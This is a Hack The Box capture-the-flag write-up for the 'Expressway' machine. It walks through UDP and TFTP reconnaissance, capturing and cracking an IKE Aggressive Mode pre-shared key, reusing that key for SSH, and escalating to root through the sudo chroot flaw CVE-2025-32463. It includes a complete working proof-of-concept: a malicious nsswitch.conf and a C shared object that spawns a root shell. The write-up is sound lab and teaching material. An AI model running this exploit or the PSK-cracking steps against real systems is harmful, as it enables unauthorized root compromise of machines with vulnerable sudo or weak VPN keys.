---
title: HTB - Expressway (Easy)
date: 2026-02-25 00:00:00 +0000
categories: [Hack The Box, Machine]
tags: [hackthebox, machine, linux, easy, tftp, vpn, ipsec, ike, psk cracking, sudo, chroot]     # TAG names should always be lowercase
image: /assets/img/expressway/image%201.png
---

## Summary Exploitation
The Expressway machine on Hack The Box was an easy-level challenge that highlighted the dangers of cleartext configuration files and the importance of patching core Linux utilities. The exploitation process began with a UDP-focused reconnaissance phase that uncovered an insecurely configured TFTP service, which leaked a Cisco configuration file containing cleartext credentials and VPN parameters. By identifying a support for IKE Aggressive Mode, I captured an authentication hash and performed an offline dictionary attack to recover a Pre-Shared Key (PSK). This key was reused to gain a successful SSH foothold as the user ike.

Once inside, local enumeration revealed a vulnerable version of Sudo, which allowed for a sophisticated privilege escalation via CVE-2025-32463. By crafting a malicious Name Service Switch (NSS) configuration and a custom Shared Object (.so) within a controlled chroot environment, I hijacked Sudo's root-privileged execution flow to spawn a root shell and fully compromise the machine.

## Reconnaissance
### Scanning IP Address
We start with a standard Nmap scan to identify open TCP ports and services:
Nmap scan:
```
nmap -sC -sV 10.129.4.89
```
![nmap TCP result](/assets/img/expressway/image%202.png)

The scan shows that only port 22 (SSH) is open. Since Nmap scans the top 1,000 TCP ports by default, we need to broaden our scope to include UDP ports to find other potential entry points.

### Scanning UDP
Perform a UDP scan on the top 100 ports:

```
sudo nmap -sU --top-ports 100 -sV 10.129.4.89
```
![nmap UDP result](/assets/img/expressway/image%203.png)

This scan is much more revealing. We've identified several active UDP services, TFTP (69) and ISAKMP (500).

### Enumerate files in TFTP
First, let's enumerate possible files that available in TFTP
```
nmap -sU -p 69 --script tftp-enum 10.129.4.89
```
![nmap TFTP enumerate result](/assets/img/expressway/image%204.png)

Looks like there is `ciscortr.cfg` file in the TFTP. Download the file to our kali machine to see the content.
```
tftp 10.129.4.89
get ciscortr.cfg
```

### View the downloaded file
The file contains several critical sections that reveals the internal network topology and the credentials required to establish a VPN connection.

**1. No password encryption**

![no pass enc](/assets/img/expressway/image%205.png)

This `no service password-encryption` means that any passwords set on the device are stored in cleartext within the configuration file rather than being hashed.

**2. Found the username**

![vusername info](/assets/img/expressway/image%209.png)

We got the username `ike`, this is our target user for gaining an access

**3. VPN Information & ISAKMP Policy**

![vpn info](/assets/img/expressway/image%206.png)

This reveals critical information regarding the VPN configuration, specifically the parameters required to establish a tunnel:

Encryption: `3DES`\
Diffie-Hellman: `2`\
Group Name (ID): `rtr-remote`\
Domain Name: `expressway.htb`


### Finding more information about IPSec/IKE VPN
Based on [ipsec ike vpn pentesting](https://book.hacktricks.wiki/en/network-services-pentesting/ipsec-ike-vpn-pentesting.html#500udp---pentesting-ipsecike-vpn), we need to get more information about the IPSec.

```
ike-scan -M 10.129.4.89
```
![endpoint info](/assets/img/expressway/image%207.png)

Check if the handshake support Aggresive Mode:
```
ike-scan -A 10.129.4.89
```
![aggresive info](/assets/img/expressway/image%208.png)

Bingo! the IKE support Aggressive Mode which we can leaks more info like group name or PSK related data. But because we have already the group name, so we don't need to brute force to find the valid one.

## Initial Access
### Attack Strategy
So based on the information we have gather, we have a valid transformation, a group name, and the aggressive mode is allowed, then we can capture the hash and crack it to get the PSK.

### Capturing the hash
```
ike-scan -M -A -n --id=rtr-remote --pskcrack=hash.txt 10.129.4.89
```
![hash](/assets/img/expressway/image%2010.png)

We successfully tricked the router to give the authentication hash by abusing how the [aggressive mode works](https://community.fortinet.com/t5/FortiGate/Technical-Tip-Differences-between-Aggressive-and-Main-mode-in/ta-p/196313)

### Crack the hash
```
psk-crack -d /usr/share/wordlists/rockyou.txt hash.txt
```
![cracked hash](/assets/img/expressway/image%2011.png)

Nice! we got the PSK \
Cracked hash: `freakingrockstarontheroad`

### Login into the SSH
We can try to reuse the recovered PSK as the password for the SSH login
```
ssh ike@10.129.4.89
password: freakingrockstarontheroad
```

### User Flag
![user flag](/assets/img/expressway/image%2012.png)

## Privilege Escalation
### Local Enumeration
Let's start with running the linpeas
![sudo info](/assets/img/expressway/image%2013.png)

The result shows the version of the sudo. Based on the [CVE-2025-32463](https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-version) this version allows unprivileged local users to escalate their privileges to root via sudo  `--chroot` option when `/etc/nsswitch.conf` file is used from a user controlled directory.

### Technical Breakdown
We begin by creating a temporary directory in `/tmp` named `woot`. The primary function of a chroot (change root) operation is to reset the root directory path to a new location. For example, executing `sudo -R woot woot` tells the system to treat the `/tmp/woot` directory as the new system root (`/`). But with simply changing the root path, it is not enough to gain elevated privileges. So how we can gain a full access to root with this?

**1. Exploiting the Name Service Switch (NSS) Logic** \
The interesting part lies in the sudo chroot logic, specifically how it handles the **Name Service Switch (NSS)** configuration during the filesystem transition. By creating a fake `/etc/nsswitch.conf` inside our untrusted `woot` directory, we can trick sudo into trusting our malicious configuration. If we provide a script that can break out of the woot directory and execute a shell back in the real root system, we can achieve full root access.

**2. Injecting an Arbitrary Shared Object (.so)** \
In Linux, the `nsswitch.conf` file serves as a map for the system to look up information like passwords and groups. When we add `passwd: /woot1337` to our fake configuration, the system attempts to resolve this source. The NSS logic automatically translates the source string into a library filename using the pattern `libnss_[source].so.2`. Consequently, our entry `/woot1337` causes sudo to search for `libnss_/woot1337.so.2` relative to our current working directory.

**3. Execution via Root Authority** \
Because sudo is a SetUID binary that runs with root authority, our shared object is loaded into a root-privileged memory space. Our C code uses the `__attribute__((constructor))` directive to ensure it runs immediately upon loading. It then calls `setreuid(0,0)` to assume root privileges, breaks out of the woot directory with `chdir("/")`, and executes `/bin/bash` which handing us a root shell.

Detail explanation in this article [CVE-2025-32463 Sudo chroot Elevation of Privilege Walkthrough](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/) and [POC script](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot)

### Proof Of Concept

```
ike@expressway:~$ cd /tmp
ike@expressway:/tmp$ mkdir -p woot/etc libnss_
ike@expressway:/tmp$ echo "passwd: /woot1337" > woot/etc/nsswitch.conf
ike@expressway:/tmp$ cp /etc/group woot/etc
ike@expressway:/tmp$ cat > woot1337.c <<EOF
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void woot(void) {
  setreuid(0,0);
  setregid(0,0);
  chdir("/");
  execl("/bin/bash", "/bin/bash", NULL);
}
EOF
ike@expressway:/tmp$ gcc -shared -fPIC -Wl,-init,woot -o libnss_/woot1337.so.2 woot1337.c
ike@expressway:/tmp$ sudo -R woot woot
root@expressway:/# id
uid=0(root) gid=0(root) groups=0(root),13(proxy),1001(ike)
```

### Root Flag
![root flag](/assets/img/expressway/image%2014.png)

And we got the root flag!